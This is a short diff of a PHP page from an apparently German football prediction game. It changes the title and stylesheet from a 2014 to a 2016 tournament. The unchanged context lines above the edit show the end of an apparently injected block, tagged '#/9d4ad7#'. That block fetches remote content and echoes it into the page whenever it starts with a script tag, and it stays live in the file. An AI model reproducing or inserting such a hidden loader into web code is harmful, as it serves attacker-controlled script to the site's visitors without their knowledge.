@@ -25,8 +25,8 @@ elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp
 if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
 #/9d4ad7#
 ?>
-<title>Werkes WM-Tipp</title>
-<link rel="stylesheet" type="text/css" href="../../style/style-WM2014.css" />
+<title>Werke's Tippspiel - Tippabgabe</title>
+<link rel="stylesheet" type="text/css" href="../../style/style-EM2016.css" />
 <?php
 echo "<frameset cols='280,*'>";
 echo "<frame src='./overview.php5?userId=$userId' name='Navigation'>";
